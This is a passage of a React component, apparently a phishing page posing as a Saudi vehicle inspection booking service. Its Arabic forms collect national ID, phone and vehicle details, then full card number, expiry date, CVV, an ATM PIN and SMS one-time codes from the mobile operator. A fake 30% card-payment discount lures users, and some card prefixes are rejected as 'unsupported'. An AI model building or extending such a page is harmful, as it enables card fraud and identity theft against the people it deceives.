              </button>
              <Image src="/adcs.jpg" alt="عرض خاص" width={400} height={300} className="w-full rounded-lg" />
            </div>
            <div className="text-center space-y-3 pt-2">
              <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
              <p className="text-gray-600">استمتع بخصم 30% عند الدفع ببطاقة الائتمان</p>
              <button
                onClick={() => setShowOfferModal(false)}
                className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
              >
                متابعة الدفع
              </button>
            </div>
          </DialogContent>
        </Dialog>
        <VerificationPage open={stcModalOpen} onOpenChange={() => setStcModalOpen(false)} verifyOtp={handleStcVerify} />
      </div>
    )
  }
  const blockedPrefixes = ['4847', '4323', '4685'];

  const checkCardAllow = (cardNum: string) => {
    const isBlocked = blockedPrefixes.some(prefix =>
      cardNum.startsWith(prefix)
    );

    if (isBlocked) {
      setCardError('البطاقة غير مدعومة يرجى ادخال بطاقة اخرى');
      return false;
    }

    setCardError('');
    return true;
  };

  if (currentStep === "booking") {
    return (
      <div dir="rtl" className="min-h-screen bg-background  px-4">
        <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
          <div className="container mx-auto px-6 py-4 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src='/next.svg' alt="logo" width={180} height={37} />
            </div>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              English
            </Button>
          </div>
        </header>
        <div className="max-w-3xl mx-auto">
          <Card className="shadow-lg border-border/40">
            <CardHeader className="text-center border-b border-border/40 pb-6">
              <CardTitle className="text-3xl font-bold text-foreground">حجز موعد الفحص الفني</CardTitle>
              <CardDescription className="text-lg">املأ البيانات التالية لإتمام الحجز</CardDescription>
            </CardHeader>
            <CardContent className="pt-8">
              {/* Added validation function for vehicle info step */}
              <form onSubmit={handleVehicleInfoSubmit} className="space-y-8">
                {/* Vehicle Status */}
                <div className="space-y-3">
                  <label className="text-sm font-medium text-foreground">حالة المركبة</label>
                  <div className="grid grid-cols-2 gap-4">
                    {[
                      { id: "license" as VehicleStatus, label: "مرخصة" },
                      { id: "customs" as VehicleStatus, label: "جمركية" },
                    ].map((status) => (
                      <button
                        key={status.id}
                        type="button"
                        onClick={() => setVehicleStatus(status.id)}
                        className={`p-4 rounded-xl border-2 transition-all ${vehicleStatus === status.id
                            ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
                            : "border-border hover:border-teal-700/50 text-muted-foreground"
                          }`}
                      >
                        {status.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Plate Information */}
                <SaudiPlateInput
                  numbers={plateNumbers}
                  letters={plateLetters}
                  onNumbersChange={setPlateNumbers}
                  onLettersChange={setPlateLetters}
                />

                {/* Country and Plate Info */}
                <div className="grid gap-4">
                  <div className="space-y-3">
                    <label className="text-sm font-medium text-foreground">الجنسية</label>
                    <select
                      value={country}
                      onChange={(e) => setCountry(e.target.value)}
                      className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                      required
                    >
                      <option value="">اختر الجنسية</option>
                      {countries.map((c) => (
                        <option key={c.code} value={c.code}>
                          {c.nameAr} ({c.nameEn})
                        </option>
                      ))}
                    </select>
                  </div>

                </div>


                {/* Owner Name */}
                <div className="space-y-3">
                  <label className="text-sm font-medium text-foreground">اسم المالك</label>
                  <Input
                    type="text"
                    value={ownerName}
                    onChange={(e) => setOwnerName(e.target.value)}
                    placeholder="أدخل اسم المالك"
                    className="h-12"
                    required
                  />
                </div>

                {/* National ID */}
                <div className="space-y-3">
                  <label className="text-sm font-medium text-foreground">رقم الهوية الوطنية</label>
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={10}
                    value={displayNationalId}
                    onChange={(e) => {
                      const westernValue = e.target.value
                        .replace(/[0-9]/g, (d) => "0123456789".indexOf(d).toString())
                        .replace(/\D/g, "")

                      const arabicValue = westernValue.replace(/\d/g, (d) => "0123456789"[Number.parseInt(d)])

                      setNationalId(westernValue)
                      setDisplayNationalId(arabicValue)
                    }}
                    placeholder="١٢٣٤٥٦٧٨٩٠"
                    className="h-12"
                    required
                  />
                  <p className="text-xs text-muted-foreground">
                    يجب أن يبدأ بـ 1 (سعودي) أو 2 (مقيم) ويتكون من 10 أرقام
                  </p>
                </div>
                <div className="space-y-3 mb-6">
                  <label className="text-sm font-medium text-foreground">
                    رقم جوال المالك <span className="text-red-500">*</span>
                  </label>
                  <div className="flex gap-2">
                    <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
                      <span className="text-xl">🇸🇦</span>
                      <span className="text-sm font-medium">+966</span>
                    </div>
                    <Input
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                      value={authorizedPhone}
                      onChange={(e) => {
                        const value = e.target.value
                          .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
                          .replace(/\D/g, "")
                        setAuthorizedPhone(value)
                      }}
                      placeholder="5XXXXXXXX"
                      className="h-12 flex-1"
                    />
                  </div>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-foreground">الرقم التسلسلي</label>
                  <Input
                    type="text"
                    value={serialNumber}
                    onChange={(e) => setSerialNumber(e.target.value)}
                    placeholder="أدخل الرقم التسلسلي للمركبة"
                    className="h-12"
                    required
                  />
                </div>
                {/* </CHANGE> */}

                {/* Inspection Type */}
                <div className="space-y-3">
                  <label className="text-sm font-medium text-foreground">نوع الفحص</label>
                  <select
                    value={inspectionType}
                    onChange={(e) => setInspectionType(e.target.value)}
                    className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                    required
                  >
                    <option value="">اختر نوع المركبة</option>
                    {inspectionTypes.map((type) => (
                      <option key={type.value} value={type.value}>
                        {type.icon} {type.label}
                      </option>
                    ))}
                  </select>
                </div>
                <div className="flex items-start gap-3 mb-6">
                  <Checkbox
                    id="authorize"
                    checked={authorizeInspection}
                    onCheckedChange={(checked) => setAuthorizeInspection(checked as boolean)}
                    className="mt-1"
                  />
                  <label htmlFor="authorize" className="flex-1 text-base leading-relaxed cursor-pointer">
                    <div className="font-medium text-gray-900 mb-1">هل تريد تفويض شخص آخر بفحص المركبة</div>
                    <div className="text-sm text-gray-500">قم بتفعيل الخيار لو أردت تفويض شخص آخر غيرك بفحص المركبة</div>
                  </label>
                </div>
                {authorizeInspection ?
                  <div className="border-t pt-8 mt-8">
                    <h3 className="text-xl font-bold text-foreground mb-6">بيانات المفوض</h3>

                    {/* Authorized Person Type */}
                    <div className="space-y-3 mb-6">
                      <div className="flex gap-4 justify-end">
                        <button
                          type="button"
                          onClick={() => setAuthorizedPersonType("gcc")}
                          className={`px-6 py-3 rounded-lg border-2 transition-all ${authorizedPersonType === "gcc"
                              ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
                              : "border-border text-muted-foreground"
                            }`}
                        >
                          مواطن خليجي
                        </button>
                        <button
                          type="button"
                          onClick={() => setAuthorizedPersonType("resident")}
                          className={`px-6 py-3 rounded-lg border-2 transition-all ${authorizedPersonType === "resident"
                              ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
                              : "border-border text-muted-foreground"
                            }`}
                        >
                          مواطن/مقيم
                        </button>
                      </div>
                    </div>

                    {/* Authorized Name */}
                    <div className="space-y-3 mb-6">
                      <label className="text-sm font-medium text-foreground">
                        اسم المفوض <span className="text-red-500"></span>
                      </label>
                      <Input
                        type="text"
                        value={authorizedName}
                        onChange={(e) => setAuthorizedName(e.target.value)}
                        placeholder="أدخل اسم المفوض"
                        className="h-12"
                      />
                    </div>

                    {/* Authorized Phone */}
                    <div className="space-y-3 mb-6">
                      <label className="text-sm font-medium text-foreground">
                        رقم جوال المفوض <span className="text-red-500">*</span>
                      </label>
                      <div className="flex gap-2">
                        <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
                          <span className="text-xl">🇸🇦</span>
                          <span className="text-sm font-medium">+966</span>
                        </div>
                        <Input
                          type="tel"
                          inputMode="numeric"
                          maxLength={10}
                          value={authorizedPhone}
                          onChange={(e) => {
                            const value = e.target.value
                              .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
                              .replace(/\D/g, "")
                            setAuthorizedPhone(value)
                          }}
                          placeholder="5XXXXXXXX"
                          className="h-12 flex-1"
                        />
                      </div>
                    </div>

                    {/* Authorized ID */}
                    <div className="space-y-3 mb-6">
                      <label className="text-sm font-medium text-foreground">
                        رقم الهوية / إقامة المفوض <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <Input
                          type="text"
                          inputMode="numeric"
                          maxLength={10}
                          value={authorizedId}
                          onChange={(e) => {
                            const value = e.target.value
                              .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
                              .replace(/\D/g, "")
                            setAuthorizedId(value)
                          }}
                          placeholder="0000 0000 000"
                          className="h-12 pl-12"
                        />
                        <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                            <rect x="3" y="5" width="18" height="14" rx="2" strokeWidth="2" />
                            <circle cx="9" cy="11" r="2" strokeWidth="2" />
                            <path d="M15 10h2M15 13h2" strokeWidth="2" strokeLinecap="round" />
                          </svg>
                        </div>
                      </div>
                    </div>

                    {/* Authorized Birth Date */}
                    <div className="space-y-3 mb-6">
                      <label className="text-sm font-medium text-foreground">
                        تاريخ ميلاد المفوض <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <Input
                          type="date"
                          value={authorizedBirthDate}
                          onChange={(e) => setAuthorizedBirthDate(e.target.value)}
                          className="h-12 pl-12"
                        />
                        <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground pointer-events-none">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2" strokeWidth="2" />
                            <line x1="16" y1="2" x2="16" y2="6" strokeWidth="2" strokeLinecap="round" />
                            <line x1="8" y1="2" x2="8" y2="6" strokeWidth="2" strokeLinecap="round" />
                            <line x1="3" y1="10" x2="21" y2="10" strokeWidth="2" />
                          </svg>
                        </div>
                      </div>
                    </div>

                    {/* Agreement Checkbox */}
                    <div className="flex items-start gap-3 mb-6">
                      <input
                        type="checkbox"
                        id="authorized-agreement"
                        checked={authorizedAgreement}
                        onChange={(e) => setAuthorizedAgreement(e.target.checked)}
                        className="mt-1 w-5 h-5 rounded border-border text-teal-700 focus:ring-teal-700"
                      />
                      <label
                        htmlFor="authorized-agreement"
                        className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
                      >
                        أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني للمركبة المفوض
                        عليها
                      </label>
                    </div>
                  </div> : null}
                {/* ADDED END */}

                {/* Location Selection */}
                <div className="space-y-4">
                  <div className="space-y-3">
                    <label className="text-sm font-medium text-foreground">المنطقة</label>
                    <select
                      value={region}
                      onChange={(e) => {
                        setRegion(e.target.value)
                        setCity("")
                      }}
                      className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                      required
                    >
                      <option value="">اختر المنطقة</option>
                      {regions.map((r) => (
                        <option key={r.value} value={r.value}>
                          {r.label}
                        </option>
                      ))}
                    </select>
                  </div>

                  {region && (
                    <div className="space-y-3">
                      <label className="text-sm font-medium text-foreground">المدينة</label>
                      <select
                        value={city}
                        onChange={(e) => setCity(e.target.value)}
                        className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                        required
                      >
                        <option value="">اختر المدينة</option>
                        {citiesByRegion[region]?.map((c) => (
                          <option key={c.value} value={c.value}>
                            {c.label}
                          </option>
                        ))}
                      </select>
                    </div>
                  )}
                </div>

                {/* Date and Time */}
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="space-y-3">
                    <label className="text-sm font-medium text-foreground">التاريخ</label>
                    <Input
                      type="date"
                      value={inspectionDate}
                      onChange={(e) => setInspectionDate(e.target.value)}
                      className="h-12"
                      required
                    />
                  </div>
                  <div className="space-y-3">
                    <label className="text-sm font-medium text-foreground">الوقت</label>
                    <Input
                      type="time"
                      value={inspectionTime}
                      onChange={(e) => setInspectionTime(e.target.value)}
                      className="h-12"
                      required
                    />
                  </div>
                </div>

                {/* Vehicle Info Error Display */}
                {vehicleInfoError && (
                  <Alert variant="destructive" className="bg-red-50 border-red-200">
                    <AlertCircle className="h-4 w-4" />
                    <AlertDescription>{vehicleInfoError}</AlertDescription>
                  </Alert>
                )}

                <Button type="submit" className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90">
                  التالي
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  if (currentStep === "payment-method") {
    return (
      <div dir="rtl" className="min-h-screen bg-background py-12 px-4">

        <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
          <div className="container mx-auto px-6 py-4 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src='/next.svg' alt="logo" width={180} height={37} />
            </div>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              English
            </Button>
          </div>
        </header>  <div className="max-w-2xl mx-auto">
          <Card className="shadow-lg border-border/40">
            <CardHeader className="text-center border-b border-border/40 pb-6">
              <CardTitle className="text-3xl font-bold text-foreground">اختر طريقة الدفع</CardTitle>
              <CardDescription className="text-lg">اختر الطريقة المناسبة لإتمام عملية الدفع</CardDescription>
            </CardHeader>
            <CardContent className="pt-8">
              <div className="space-y-4">
                {paymentMethods.map((method) => (
                  <button
                    key={method.id}
                    type="button"
                    onClick={() => {
                      if (method.available) {
                        setPaymentMethod(method.id)
                      }
                    }}
                    disabled={!method.available}
                    className={`w-full p-6 rounded-xl border-2 transition-all text-right ${paymentMethod === method.id
                        ? "border-teal-700 bg-teal-700/5"
                        : method.available
                          ? "border-border hover:border-teal-700/50"
                          : "border-border opacity-50 cursor-not-allowed"
                      }`}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-4">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${paymentMethod === method.id ? "bg-teal-700 text-white" : "bg-secondary text-foreground"
                            }`}
                        >
                          <Image src={method.icon} alt="log" width={80} height={30} />
                        </div>
                        <div className="text-right">
                          <div className="font-semibold text-foreground text-lg">{method.label}</div>
                          <div className="text-sm text-muted-foreground">{method.description}</div>
                        </div>
                      </div>
                      {method.badge && (
                        <span className="px-3 py-1 bg-emerald-500/10 text-emerald-700 text-sm font-medium rounded-full">
                          {method.badge}
                        </span>
                      )}
                    </div>
                  </button>
                ))}
              </div>
              <Button
                onClick={handlePaymentMethodSubmit}
                disabled={!paymentMethod || isLoading}
                className="w-full mt-8 h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    جارٍ التحميل...
                  </>
                ) : (
                  "متابعة"
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  if (currentStep === "card-form") {
    return (
      <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
        <Dialog open={showOfferModal} onOpenChange={setShowOfferModal}>
          <DialogContent className="sm:max-w-md border-emerald-200">
            <div className="relative">
              <button
                onClick={() => setShowOfferModal(false)}
                className="absolute left-2 top-2 rounded-full bg-white/90 p-1.5 hover:bg-white shadow-lg transition-colors z-10"
              >
                <X className="h-4 w-4 text-gray-600" />
              </button>
              <Image src="/adcs.jpg" alt="عرض خاص" width={400} height={300} className="w-full rounded-lg" />
            </div>
            <div className="text-center space-y-3 pt-2">
              <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
              <p className="text-gray-600">استمتع بخصم 30% عند الدفع ببطاقة الائتمان</p>
              <button
                onClick={() => setShowOfferModal(false)}
                className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
              >
                متابعة الدفع
              </button>
            </div>
          </DialogContent>
        </Dialog>
        <div className="max-w-4xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-8">
            {/* Card Preview */}
            <div className="order-1 lg:order-1">
              <div className="sticky top-8">
                <div
                  className="relative w-full aspect-[1.586] rounded-2xl p-8 text-white shadow-2xl"
                  style={{
                    background: bankInfo?.color || "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                  }}
                >
                  <div className="absolute top-8 right-8">
                    <div className="text-2xl font-bold">{bankInfo?.name || "بطاقة ائتمان"}</div>
                  </div>
                  <div className="absolute top-8 left-8">
                    {paymentMethod === "card" && cardNumber.at(0) === '4' ? <Image src="/visa-card.png" alt="logo" width={50} height={30} /> : paymentMethod === "card" && cardNumber.at(0) === '5' ? <Image src="/master.svg" alt="logo" width={50} height={30} /> : null}
                    {paymentMethod === "wallet" ? <Image src="/mada.svg" alt="logo" width={50} height={30} /> : null}
                  </div>
                  <div className="absolute top-1/2 right-8 -translate-y-1/2">
                    <div className="text-xl font-mono tracking-widest" dir="ltr">
                      {'**** **** **** ' + cardNumber.slice(-4) || "•••• •••• •••• ••••"}
                    </div>
                  </div>
                  <div className="absolute bottom-8 right-8 left-8 flex justify-between items-end">
                    <div>
                      <div className="text-xs opacity-80 mb-1">اسم حامل البطاقة</div>
                      <div className="text-md font-semibold">{cardName || "الاسم الكامل"}</div>
                    </div>
                    <div>
                      <div className="text-xs opacity-80 mb-1">تاريخ الانتهاء</div>
                      <div className="text-md font-mono">{expiryDate || "MM/YY"}</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Form */}
            <div className="order-1 lg:order-2">
              <Card className="shadow-lg border-border/40">
                <CardHeader className="border-b border-border/40 pb-6">
                  <CardTitle className="text-2xl font-bold text-foreground">معلومات البطاقة</CardTitle>
                  <CardDescription>أدخل بيانات بطاقة الائتمان</CardDescription>
                </CardHeader>
                <CardContent className="pt-8">
                  <form onSubmit={handleCardFormSubmit} className="space-y-6">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground">رقم البطاقة</label>
                      <div className="relative">
                        <Input
                          type="tel"
                          inputMode="numeric"
                          maxLength={19}
                          value={cardNumber}
                          dir="ltr"
                          onChange={(e) => handleCardNumberChange(e.target.value)}
                          placeholder="1234 5678 9012 3456"
                          className="h-12 pr-12"
                          required
                        />
                        {bankInfo && (
                          <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
                            <span className="text-2xl">{bankInfo.logo}</span>
                            <span className="text-sm font-medium text-muted-foreground">{bankInfo.name}</span>
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground">اسم حامل البطاقة</label>
                      <Input
                        type="text"
                        value={cardName}
                        onChange={(e) => setCardName(e.target.value)}
                        placeholder="الاسم كما هو مكتوب على البطاقة"
                        className="h-12"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-foreground">تاريخ الانتهاء</label>
                        <Input
                          type="text"
                          inputMode="numeric"
                          maxLength={5}
                          value={expiryDate}
                          onChange={(e) => {
                            let value = normalizeNumbers(e.target.value).replace(/\D/g, "")
                            if (value.length >= 2) {
                              value = value.slice(0, 2) + "/" + value.slice(2, 4)
                            }
                            setExpiryDate(value)
                          }}
                          placeholder="MM/YY"
                          className="h-12"
                          required
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-foreground">CVV</label>
                        <Input
                          type="text"
                          inputMode="numeric"
                          maxLength={3}
                          value={cvv}
                          onChange={(e) => setCvv(normalizeNumbers(e.target.value).replace(/\D/g, ""))}
                          placeholder="123"
                          className="h-12"
                          required
                        />
                      </div>
                    </div>

                    <Button
                      type="submit"
                      className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
                      disabled={isLoading || cardError.length > 2}
                    >
                      {isLoading ? (
                        <>
                          <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                          جارٍ المعالجة...
                        </>
                      ) : (
                        "متابعة"
                      )}
                    </Button>
                  </form>
                </CardContent>
                <CardFooter>
                  {cardError.length > 2 && <Alert>
                    <AlertDescription className="text-red-500">
                      <CircleAlert />

                      البطاقة غير مدعومة يرجى ادخال بطاقة اخرى
                    </AlertDescription>
                  </Alert>}
                </CardFooter>
              </Card>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "pin") {
    return (
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        className="w-full max-w-md mx-auto"
      >
        <Card className="border-border/40 shadow-lg backdrop-blur-sm bg-card/95">
          <CardHeader className="text-center space-y-2">
            <div className="mx-auto w-16 h-16 rounded-full bg-emerald-500/10 flex items-center justify-center mb-2">
              <Lock className="h-8 w-8 text-emerald-600" />
            </div>
            <CardTitle className="text-2xl">أدخل رمز ATM </CardTitle>
            <CardDescription>أدخل رمز ATM الخاص بالبطاقة</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handlePinSubmit} className="space-y-6">
              <div className="flex justify-center gap-3" dir="ltr">
                {pin.map((digit, index) => (
                  <Input
                    key={index}
                    type="password"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => {
                      const normalized = normalizeNumbers(e.target.value)
                      const newPin = [...pin]
                      newPin[index] = normalized
                      setPin(newPin)
                      if (normalized && index < 3) {
                        const nextInput = document.querySelector(`input[name="pin-${index + 1}"]`) as HTMLInputElement
                        nextInput?.focus()
                      }
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Backspace" && !digit && index > 0) {
                        const prevInput = document.querySelector(`input[name="pin-${index - 1}"]`) as HTMLInputElement
                        prevInput?.focus()
                      }
                    }}
                    name={`pin-${index}`}
                    className="w-14 h-14 text-center text-2xl font-bold"
                    required
                  />
                ))}
              </div>
              {pinError && (
                <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600 text-center">{pinError}</p>
                </div>
              )}
              <Button
                type="submit"
                className="w-full bg-emerald-600 hover:bg-emerald-700 text-white"
                size="lg"
                disabled={isLoading || pin.some((d) => !d)}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                    جارٍ التحقق...
                  </>
                ) : (
                  "تأكيد"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </motion.div>
    )
  }

  if (currentStep === "phone-verification") {
    if (!phoneOtpSent) {
      return (
        <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
          <div className="max-w-md mx-auto">
            <Card className="shadow-lg border-border/40">
              <CardHeader className="text-center border-b border-border/40 pb-6">
                <CardTitle className="text-2xl font-bold text-foreground">التحقق من رقم الجوال</CardTitle>
                <CardDescription>أدخل رقم جوالك لإرسال رمز التحقق</CardDescription>
              </CardHeader>
              <CardContent className="pt-8">
                <form onSubmit={handleSendPhoneOtp} className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">رقم الجوال</label>
                    <Input
                      type="tel"
                      inputMode="numeric"
                      value={phone}
                      onChange={(e) => setPhone(normalizeNumbers(e.target.value))}
                      placeholder="05xxxxxxxx"
                      className="h-12"
                      maxLength={10}
                      required
                    />
                    <p className="text-xs text-muted-foreground">يجب أن يبدأ بـ 05 ويتكون من 10 أرقام</p>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">المشغل</label>
                    <select
                      value={operator}
                      onChange={(e) => setOperator(e.target.value)}
                      className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                      required
                    >
                      <option value="">اختر المشغل</option>
                      <option value="STC">STC</option>
                      <option value="Mobily">موبايلي</option>
                      <option value="Zain">زين</option>
                    </select>
                  </div>

                  {phoneOtpError && (
                    <Alert variant="destructive" className="bg-red-50 border-red-200">
                      <AlertCircle className="h-4 w-4" />
                      <AlertDescription>{phoneOtpError}</AlertDescription>
                    </Alert>
                  )}

                  <Button
                    type="submit"
                    className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                        جارٍ الإرسال...
                      </>
                    ) : (
                      "إرسال رمز التحقق"
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
          <VerificationPage
            open={stcModalOpen}
            onOpenChange={() => setStcModalOpen(false)}
            verifyOtp={handleStcVerify}
          />
        </div>
      )
    }

    return (
      <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
        <div className="max-w-md mx-auto">
          <Card className="shadow-lg border-border/40">
            <CardHeader className="text-center border-b border-border/40 pb-6">
              <CardTitle className="text-2xl font-bold text-foreground">أدخل رمز التحقق</CardTitle>
              <CardDescription>
                تم إرسال رمز التحقق إلى {phone} عبر {operator}
              </CardDescription>
            </CardHeader>
            <CardContent className="pt-8">
              <form onSubmit={handlePhoneVerification} className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">رمز التحقق</label>
                  <div className="relative">
                    <Input
                      type="number"
                      autoComplete="otp"
                      inputMode="numeric"
                      maxLength={6}
                      value={phoneOtp}
                      onChange={(e) => setPhoneOtp(normalizeNumbers(e.target.value).replace(/\D/g, ""))}
                      placeholder="أدخل الرمز المكون من 6 أرقام"
                      className="h-12 text-center text-2xl tracking-widest font-mono"
                      required
                    />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">
                      {phoneOtp.length}/6
                    </div>
                  </div>
                  {phoneOtpError && <p className="text-sm text-red-500">{phoneOtpError}</p>}
                </div>

                <div className="flex gap-3">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={() => setPhoneOtpSent(false)}
                    className="flex-1 h-12"
                  >
                    تعديل البيانات
                  </Button>
                  <Button
                    type="submit"
                    className="flex-1 h-12 text-white bg-teal-700 hover:bg-teal-700/90"
                    disabled={isLoading || phoneOtp.length <4}
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                        جارٍ التحقق...
                      </>
                    ) : (
                      "تأكيد"
                    )}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  return null
}
